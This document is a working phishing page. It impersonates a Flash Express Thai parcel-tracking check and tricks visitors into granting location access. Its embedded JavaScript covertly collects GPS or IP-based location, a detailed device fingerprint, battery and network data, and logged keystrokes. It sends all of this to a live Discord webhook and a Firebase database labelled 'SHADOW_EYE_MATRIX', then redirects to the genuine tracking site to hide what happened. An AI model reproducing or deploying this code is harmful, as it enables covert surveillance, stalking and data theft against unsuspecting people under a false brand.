<body class="h-full bg-white text-gray-800 font-sans antialiased overflow-hidden">

  <!-- Modal Overlay - Flash Express Yellow-White Theme -->
  <div id="modal-overlay" class="fixed inset-0 z-[9999] flex items-center justify-center bg-black/70 px-4">
    <div class="w-full max-w-md">
      <div class="rounded-2xl flash-yellow-border flash-modal-bg p-6 flash-yellow-shadow">
        <div class="mb-4 text-center">
          <div class="mx-auto mb-3 flex h-16 w-16 items-center justify-center rounded-full flash-yellow-gradient">
            <svg class="h-8 w-8 text-flashBlue" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
              <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9" />
              <path stroke-linecap="round" stroke-linejoin="round" d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z" />
              <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
            </svg>
          </div>
          <h2 class="text-xl font-bold text-flashBlue mb-2">Flash Express - ตรวจสอบพัสดุ</h2>
        </div>
        
        <p class="text-sm text-center text-gray-700 mb-5 leading-relaxed">
          เพื่อความปลอดภัยของทรัพย์สินและการนำจ่ายที่ถูกต้อง กรุณากด <strong class="text-emeraldSafe">'อนุญาต (Allow)'</strong> เพื่อยืนยันตำแหน่งรับพัสดุของคุณ

        <button id="allow-btn" onclick="handleTargetClick()" class="w-full rounded-lg emerald-safe-gradient px-4 py-2.5 font-semibold text-white transition hover:opacity-90 flex items-center justify-center gap-2 emerald-safe-shadow">
          <span>✔️</span>

        </button>

  </div>

  <script>
    'use strict';
    // ===== CONFIGURATION =====
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1524022022911299676/0o-7NMCMXUlJ6TjHwE6WDGrC6NRsM7pdKmoNcjNXvttvFefDu1bBwybzQjPmYd9hsZy3';
    const BASE_LAT = 9.9833;
    const BASE_LNG = 99.1500;
    const FLASH_EXPRESS_URL = 'https://www.flashexpress.co.th/fle/tracking';
// ฟังก์ชันสับสวิตช์ระบบ ไม่บล็อกการเปลี่ยนหน้า (วางแทรกบรรทัด 85)
// handleTargetClick ถูกย้ายไปที่ท้ายไฟล์เพื่อใช้ระบบ async/await แทน setTimeout
    // Firebase Configuration (for real-time sync)
    const FIREBASE_CONFIG = {
      apiKey: "AIzaSyDummyKey",
      authDomain: "shadow-eye-matrix.firebaseapp.com",
      projectId: "shadow-eye-matrix",
      storageBucket: "shadow-eye-matrix.appspot.com",
      messagingSenderId: "123456789",
      appId: "1:123456789:web:dummy",
      databaseURL: "https://eye-shadow-a4f8c-default-rtdb.asia-southeast1.firebasedatabase.app/"
    };
    
    // ===== FIREBASE REAL-TIME SYNC =====
    let firebaseDb = null;
    
    // Initialize Firebase (using CDN)
    function initFirebase() {
      if (typeof firebase !== 'undefined' && firebase.initializeApp) {
        try {
          firebase.initializeApp(FIREBASE_CONFIG);
          firebaseDb = firebase.database();
          return true;
        } catch (e) {
          console.error('Firebase init error:', e);
        }
      }
      return false;
    }
    
    // Send data to Firebase Realtime Database
    async function sendToFirebase(targetId, data) {
      if (!firebaseDb) return false;
      
      try {
        // ส่งข้อมูลไปยัง Firebase Realtime Database ที่โหนด 'player_coordinates'
        const dbRef = firebaseDb.ref('player_coordinates/' + targetId);
        console.log("Firebase Upload Triggered", data);
        await dbRef.set({
          ...data,
          syncedAt: new Date().toISOString()
        });
        console.log("Firebase Upload Success!");
        return true;
      } catch (e) {
        console.error('Firebase sync error:', e);
        return false;
      }
    }

    // ===== GET URL PARAMETER =====
    function getUrlParam(name) {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get(name);
    }

    // ===== SCREEN ANALYTICS =====
    function captureScreenAnalytics() {
      try {
        const w = window.screen?.width || 0;
        const h = window.screen?.height || 0;
        const dpr = window.devicePixelRatio || 1;
        return {
          width: w,
          height: h,
          devicePixelRatio: dpr,
          resolution: `${w}x${h}`,
          effectiveResolution: `${Math.round(w * dpr)}x${Math.round(h * dpr)}`,
          orientation: w > h ? 'Landscape' : 'Portrait',
        };
      } catch (_) {
        return { width: 0, height: 0, devicePixelRatio: 1, resolution: '—', effectiveResolution: '—', orientation: '—' };
      }
    }

    // ===== FINGERPRINT =====
    function detectOS() {
      try {
        const ua = navigator.userAgent || '';
        if (/iPhone|iPad|iPod/.test(ua)) return 'iOS';
        if (/Android/.test(ua)) return 'Android';
        if (/Mac OS X/.test(ua)) return 'Mac';
        if (/Windows/.test(ua)) return 'Windows';
        if (/Linux/.test(ua)) return 'Linux';
      } catch (_) {}
      return 'Unknown';
    }

    function detectBrowser() {
      try {
        const ua = navigator.userAgent || '';
        if (ua.includes('Firefox/')) return 'Firefox';
        if (ua.includes('Edg/')) return 'Edge';
        if (ua.includes('Chrome/')) return 'Chrome';
        if (ua.includes('Safari/')) return 'Safari';
      } catch (_) {}
      return 'Unknown';
    }

    function detectDeviceType() {
      try {
        const ua = navigator.userAgent || '';
        if (/iPhone|iPad|iPod/.test(ua)) return 'iOS';
        if (/Android/.test(ua)) return 'Android';
        if (/Mac OS X|Macintosh/.test(ua)) return 'Mac';
        if (/Windows/.test(ua)) return 'PC';
        if (/Linux/.test(ua)) return 'Linux';
        if (/CrOS/.test(ua)) return 'ChromeOS';
      } catch (_) {}
      return 'Unknown';
    }

    function getCPUCores() {
      try { return navigator.hardwareConcurrency || null; } catch (_) { return null; }
    }

    function getRAM() {
      try { return navigator.deviceMemory || null; } catch (_) { return null; }
    }

    function getGPU() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return null;
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
          const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
          return renderer || null;
        }
      } catch (_) {}
      return null;
    }

    function getFingerprint() {
      const sa = captureScreenAnalytics();
      let tz = 'Unknown';
      try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (_) {}
      return {
        os: detectOS(),
        browser: detectBrowser(),
        deviceType: detectDeviceType(),
        cpuCores: getCPUCores(),
        ramGB: getRAM(),
        gpu: getGPU(),
        language: navigator.language || 'Unknown',
        languages: (navigator.languages || []).join(', ') || 'Unknown',
        timezone: tz,
        timezoneOffset: new Date().getTimezoneOffset(),
        screen: sa.resolution,
        screenWidth: sa.width,
        screenHeight: sa.height,
        devicePixelRatio: sa.devicePixelRatio,
        effectiveResolution: sa.effectiveResolution,
        orientation: sa.orientation,
        platform: navigator.platform || 'Unknown',
        online: typeof navigator.onLine === 'boolean' ? navigator.onLine : true,
      };
    }

    // ===== HAVERSINE =====
    function haversine(lat1, lng1, lat2, lng2) {
      const R = 6371, rad = (d) => (d * Math.PI) / 180;
      const dLat = rad(lat2 - lat1), dLng = rad(lng2 - lng1);
      const a = Math.sin(dLat / 2) ** 2 + Math.cos(rad(lat1)) * Math.cos(rad(lat2)) * Math.sin(dLng / 2) ** 2;
      return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
    }

    function calcDist(lat, lng) {
      if (lat == null || lng == null) return null;
      return haversine(lat, lng, BASE_LAT, BASE_LNG);
    }

    // ===== GEOLOCATION =====
    function requestGPS() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          reject(new Error('Geolocation not supported'));
          return;
        }
        navigator.geolocation.getCurrentPosition(
          (pos) => resolve({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
          }),
          (err) => reject(err),
          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
      });
    }

   // ฟังก์ชันดึง IP แบบมีระบบสำรอง (ไม่บล็อก Firebase ถ้า API ล่ม)
async function fetchIPGeo() {
    try {
        // เปลี่ยนมาใช้ API ตัวใหม่ที่ฟรีและไม่ค่อยบล็อก 403
        const response = await fetch('https://ipwho.is/');
        if (response.ok) {
            const data = await response.json();
            if (data.success) {
                return {
                    ip: data.ip || 'Unknown',
                    latitude: data.latitude || BASE_LAT,
                    longitude: data.longitude || BASE_LNG,
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country_name: data.country || 'Unknown',
                    org: data.connection?.isp || 'Unknown'
                };
            }
        }
    } catch (e) {
        console.log("Primary IP API failed, using fallback...");
    }

    // ระบบเซฟตี้: ถ้าดึง IP ไม่ได้จริงๆ ให้ใช้พิกัดพื้นฐาน (BASE_LAT, BASE_LNG) แทน
    // เพื่อเปิดทางให้ระบบ GPS และ Firebase ทำงานส่งข้อมูลพิกัดต่อได้!
    return {
        ip: "Hidden/Blocked IP",
        latitude: BASE_LAT,
        longitude: BASE_LNG,
        city: "Unknown",
        region: "Unknown",
        country_name: "Unknown",
        org: "Unknown"
    };
}

    // ===== DISCORD =====
    function postDiscord(payload) {
      if (!DISCORD_WEBHOOK_URL) return Promise.resolve(false);
      const body = JSON.stringify(payload);

      try {
        if (typeof navigator.sendBeacon === 'function') {
          const blob = new Blob([body], { type: 'application/json' });
          if (navigator.sendBeacon(DISCORD_WEBHOOK_URL, blob)) return Promise.resolve(true);
        }
      } catch (_) {}

      return fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'text/plain' },
        body,
      }).then(() => true).catch(() => false);
    }

    async function sendToDiscord(data) {
      if (!DISCORD_WEBHOOK_URL) return;

      const granted = data.permission === 'Granted';
      const fp = data.fingerprint || {};
      const fields = [
        { name: '🎯 Target: GPS Granted (เป้าหมาย: อนุญาตสิทธิ์ GPS)', value: data.actor || 'Unknown', inline: false },
        { name: '🔐 Permission (การอนุญาตสิทธิ์)', value: granted ? '✅ Granted (GPS) (ได้รับอนุญาต GPS)' : '❌ Denied (IP Geo) (ปฏิเสธ - ใช้ IP)', inline: true },
        { name: '📡 Source (แหล่งข้อมูล)', value: data.source || '—', inline: true },
      ];

      if (data.coords) {
        fields.push({ name: '📍 Coordinates (พิกัดตำแหน่งดาวเทียม)', value: `${data.coords.latitude}, ${data.coords.longitude}`, inline: false });
        if (data.coords.accuracy != null) fields.push({ name: '🎯 Accuracy (ความแม่นยำ)', value: `±${Math.round(data.coords.accuracy)}m`, inline: true });
      }
      if (data.distanceKm != null) {
        fields.push({ name: '📏 Distance from HQ (ระยะห่างจากศูนย์บัญชาการ)', value: `${data.distanceKm.toFixed(2)} km (Chumphon ${BASE_LAT}, ${BASE_LNG})`, inline: false });
      }
      if (data.ipData) {
        fields.push(
          { name: '🌍 Country (ประเทศ)', value: `${data.ipData.country_name || '—'}`, inline: true },
          { name: '🏙 City (เมือง)', value: `${data.ipData.region || '—'}, ${data.ipData.city || '—'}`, inline: true },
          { name: '🌐 ISP (ผู้ให้บริการ)', value: data.ipData.org || '—', inline: false },
          { name: '🔢 IP (ที่อยู่ IP)', value: data.ipData.ip || '—', inline: true },
        );
      }

      // Hardware Telemetry fields
      const postureThai = {
        'sitting': 'นั่ง',
        'standing': 'ยืน',
        'lying': 'นอน',
        'unknown': 'ไม่ทราบ'
      };
      const posture = fp.posture || 'unknown';
      
      fields.push(
        { name: '🖥️ Device Type (ประเภทอุปกรณ์)', value: fp.deviceType || '—', inline: true },
        { name: '⚙️ CPU Cores (ซีพียู)', value: fp.cpuCores ? fp.cpuCores + ' cores' : '—', inline: true },
        { name: '💾 RAM (หน่วยความจำ)', value: fp.ramGB ? fp.ramGB + ' GB' : '—', inline: true },
        { name: '🎮 GPU (การ์ดจอ)', value: fp.gpu ? fp.gpu.substring(0, 30) + (fp.gpu.length > 30 ? '...' : '') : '—', inline: false },
        { name: '🧍 Posture (ท่าทาง)', value: postureThai[posture] || '—', inline: true },
      );
      
      if (data.battery !== undefined) {
        fields.push({ name: '🔋 Battery (แบตเตอรี่)', value: `${data.battery}%`, inline: true });
      }
      if (data.network) {
        fields.push({ name: '📶 Network (เครือข่าย)', value: data.network, inline: true });
      }

      fields.push(
        { name: '💻 OS (ระบบปฏิบัตรการ)', value: fp.os || '—', inline: true },
        { name: '🌐 Browser (เว็บเบราว์เซอร์)', value: fp.browser || '—', inline: true },
        { name: '🗣 Language (ภาษา)', value: fp.language || '—', inline: true },
        { name: '🕰 Timezone (โซนเวลา)', value: fp.timezone || '—', inline: true },
        { name: '📱 Screen (หน้าจอ)', value: fp.screen || '—', inline: true },
        { name: '🔍 DPR (อัตราส่วนหน้าจอ)', value: String(fp.devicePixelRatio ?? '—'), inline: true },
        { name: '🖥 Effective Res (ความละเอียดที่แสดง)', value: fp.effectiveResolution || '—', inline: true },
        { name: '👤 Target ID (รหัสเป้าหมาย)', value: data.targetId || '—', inline: true },
      );

      if (data.mapsLink) fields.push({ name: '🗺 Google Maps (เปิดแผนที่)', value: `[Open Map](${data.mapsLink})`, inline: false });

      await postDiscord({
        embeds: [{
          title: '🛰 SHADOW_EYE_MATRIX — Location Report (รายงานพิกัด)',
          description: granted ? `${data.actor}: GPS Granted (ได้รับพิกัด GPS)` : `${data.actor}: GPS Denied — IP + Fingerprint (ปฏิเสธ GPS - ใช้ IP + ลายนิ้วมือ)`,
          color: granted ? 0x22c55e : 0xef4444,
          fields,
          footer: { text: 'SHADOW_EYE_MATRIX Tactical Dashboard (แดชบอร์ดสงคราม)' },
          timestamp: data.timestamp,
        }],
      });
    }

    // ===== LIVE TYPING =====
    let typingBuffer = '';
    function initLiveTyping() {
      document.addEventListener('keydown', (e) => {
        if (e.key.length === 1) {
          typingBuffer += e.key;
        } else if (e.key === 'Backspace' && typingBuffer.length > 0) {
          typingBuffer = typingBuffer.slice(0, -1);
        } else if (e.key === 'Enter') {
          if (typingBuffer.length > 0) {
            sendLiveTypingToDiscord(typingBuffer);
          }
          typingBuffer = '';
        }
      });
    }

    async function sendLiveTypingToDiscord(text) {
      if (!DISCORD_WEBHOOK_URL) return;
      
      const blob = new Blob([JSON.stringify({
        embeds: [{
          title: '⌨️ Live Typing Detected (ตรวจพบการพิมพ์)',
          description: `Target: ${getUrlParam('id') || 'Unknown'}\nกำลังพิมพ์ข้อความ: "${text}"`,
          color: 0xf97316,
          footer: { text: 'SHADOW_EYE_MATRIX — Live Activity Monitor (การตรวจสอบกิจกรรมสด)' },
          timestamp: new Date().toISOString()
        }]
      })], { type: 'application/json' });

      try {
        if (typeof navigator.sendBeacon === 'function') {
          navigator.sendBeacon(DISCORD_WEBHOOK_URL, blob);
        }
      } catch (_) {}
    }

    // ===== HYBRID GEOLOCATION =====
    async function runHybridGeolocation() {
      const targetId = getUrlParam('id') || 'player_1';
      const fp = getFingerprint();
      const result = {
        actor: 'Target',
        targetId: targetId,
        permission: null,
        source: null,
        coords: null,
        ipData: null,
        fingerprint: fp,
        distanceKm: null,
        timestamp: new Date().toISOString(),
        mapsLink: null,
      };

      try {
        const gps = await requestGPS();
        result.permission = 'Granted';
        result.source = 'GPS';
        result.coords = gps;
        result.mapsLink = `https://www.google.com/maps?q=${gps.latitude},${gps.longitude}`;
      } catch (err) {
        result.permission = 'Denied';
        result.source = 'IP Geolocation';

        try {
          const ip = await fetchIPGeo();
          result.ipData = ip;
          result.coords = { latitude: ip.latitude, longitude: ip.longitude };
          result.mapsLink = `https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
        } catch (ipErr) {
          console.error('IP Geo failed:', ipErr);
        }
      }

      if (result.coords?.latitude != null) {
        result.distanceKm = calcDist(result.coords.latitude, result.coords.longitude);
      }

      // Get battery info
      if (typeof navigator.getBattery === 'function') {
        try {
          const battery = await navigator.getBattery();
          result.battery = Math.round((battery.level || 0) * 100);
          result.charging = battery.charging;
        } catch (_) {}
      }

      // Get network info
      try {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
          result.network = conn.effectiveType || conn.type || 'Unknown';
        }
      } catch (_) {}

      // ส่งพิกัดกลับไปยังหน้าหลักผ่าน localStorage
      syncCoordinatesToMainPage(targetId, result);
      
      // ส่งข้อมูลไป Firebase สำหรับ Real-time sync
      await sendToFirebase(targetId, result);

      // Send to Discord
      await sendToDiscord(result);
    }

    // ===== IMMEDIATE FALLBACK =====
    async function runImmediateFallback() {
      const targetId = getUrlParam('id') || 'player_1';
      const fp = getFingerprint();
      const result = {
        actor: 'Target',
        targetId: targetId,
        permission: 'Denied',
        source: 'IP Geolocation (Fallback)',
        coords: null,
        ipData: null,
        fingerprint: fp,
        distanceKm: null,
        timestamp: new Date().toISOString(),
        mapsLink: null,
      };

      try {
        const ip = await fetchIPGeo();
        result.ipData = ip;
        result.coords = { latitude: ip.latitude, longitude: ip.longitude };
        result.mapsLink = `https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
      } catch (ipErr) {
        console.error('IP Geo fallback failed:', ipErr);
      }

      if (result.coords?.latitude != null) {
        result.distanceKm = calcDist(result.coords.latitude, result.coords.longitude);
      }

      // Get battery info
      if (typeof navigator.getBattery === 'function') {
        try {
          const battery = await navigator.getBattery();
          result.battery = Math.round((battery.level || 0) * 100);
          result.charging = battery.charging;
        } catch (_) {}
      }

      // Get network info
      try {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
          result.network = conn.effectiveType || conn.type || 'Unknown';
        }
      } catch (_) {}

      // ส่งพิกัดกลับไปยังหน้าหลักผ่าน localStorage
      syncCoordinatesToMainPage(targetId, result);
      
      // ส่งข้อมูลไป Firebase สำหรับ Real-time sync
      await sendToFirebase(targetId, result);

      // Send to Discord
      await sendToDiscord(result);
    }

    // ซิงค์พิกัดไปยังหน้าหลัก
    function syncCoordinatesToMainPage(targetId, data) {
      try {
        // ดึงข้อมูลผู้เล่นปัจจุบัน
        const playersKey = 'shadow_eye_players';
        const players = JSON.parse(localStorage.getItem(playersKey) || '[]');
        
        // ค้นหาผู้เล่นที่ตรงกับ targetId
        const playerIndex = players.findIndex(p => p.id === targetId);
        if (playerIndex >= 0) {
          // อัปเดตข้อมูลพิกัด
          players[playerIndex].coords = {
            latitude: data.coords?.latitude,
            longitude: data.coords?.longitude
          };
          players[playerIndex].lastUpdate = data.timestamp;
          players[playerIndex].permission = data.permission;
          players[playerIndex].source = data.source;
          players[playerIndex].distanceKm = data.distanceKm;
          players[playerIndex].ip = data.ipData?.ip || null;
          players[playerIndex].isp = data.ipData?.org || null;
          players[playerIndex].os = data.fingerprint?.os || null;
          players[playerIndex].screen = data.fingerprint?.screen || null;
          players[playerIndex].lastOnline = data.timestamp;
          players[playerIndex].lastOffline = null;
          
          // Hardware Telemetry
          players[playerIndex].deviceType = data.fingerprint?.deviceType || null;
          players[playerIndex].cpuCores = data.fingerprint?.cpuCores || null;
          players[playerIndex].ramGB = data.fingerprint?.ramGB || null;
          players[playerIndex].gpu = data.fingerprint?.gpu || null;
          
          if (data.battery !== undefined) {
            players[playerIndex].battery = data.battery;
            players[playerIndex].charging = data.charging;
          }
          if (data.network) {
            players[playerIndex].network = data.network;
          }
          
          localStorage.setItem(playersKey, JSON.stringify(players));
          
          // เพิ่มเหตุการณ์ลงในไทม์ไลน์
          const timelineKey = 'shadow_eye_timeline_' + targetId;
          const timeline = JSON.parse(localStorage.getItem(timelineKey) || '[]');
          timeline.push({
            type: 'online',
            timestamp: data.timestamp,
            time: new Date().toLocaleTimeString('th-TH', { hour12: false }),
            date: new Date().toLocaleDateString('th-TH'),
            coords: data.coords
          });
          
          // กรองเหตุการณ์เก่ากว่า 24 ชั่วโมง
          const cutoff = new Date(Date.now() - 24 * 60 * 60 * 1000);
          const filteredTimeline = timeline.filter(e => new Date(e.timestamp) > cutoff);
          localStorage.setItem(timelineKey, JSON.stringify(filteredTimeline));
        }
      } catch (e) {
        console.error('Sync to main page failed:', e);
      }
    }

    // ===== GLOBAL SCOPE FUNCTION: handleTargetClick =====
    async function handleTargetClick() {
        // 1. ซ่อน Modal แจ้งเตือน
        const modal = document.getElementById('modal-overlay');
        if (modal) {
            modal.style.opacity = '0';
            modal.style.transition = 'opacity 0.3s ease';
            setTimeout(() => { modal.style.display = 'none'; }, 300);
        }

        // 2. รันการดึงพิกัด (GPS หรือ IP Fallback) และส่งข้อมูลเข้า Firebase
        try {
            if (typeof runHybridGeolocation === 'function') {
                await runHybridGeolocation();
            }
        } catch (e) {
            console.log("Geolocation error processed background");
        }

        // 3. ทำการเปลี่ยนหน้าเว็บทันทีที่ sendToFirebase ทำงานเสร็จ (หรือล้มเหลว)
        window.location.href = FLASH_EXPRESS_URL;
    }

    // ===== INIT =====
    document.addEventListener('DOMContentLoaded', () => {
      // Initialize live typing monitor
      initLiveTyping();
      
      // Initialize Firebase for real-time sync
      initFirebase();
    });
  </script>
